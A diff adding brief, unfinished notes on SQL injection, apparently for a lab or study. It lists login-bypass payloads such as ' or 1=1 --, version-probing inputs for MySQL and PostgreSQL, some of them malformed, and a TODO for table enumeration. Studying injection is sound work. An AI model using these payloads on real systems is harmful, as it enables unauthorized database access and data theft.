@@ -1,0 +1,14 @@
+0. Try an SQL injection:
+    * ' or 1=1 --
+    * ' or 1=1 ;# 
+
+1. Guess what DB is used:
+    * ' or 1=1 @@version, OTHER,ROWS --
+        MySQL or MariaDB
+    * ' or 1=1 version(), OTHER,ROWS --
+        PostgreSQL
+
+2. Get the table names:
+    * TODO;
+
+
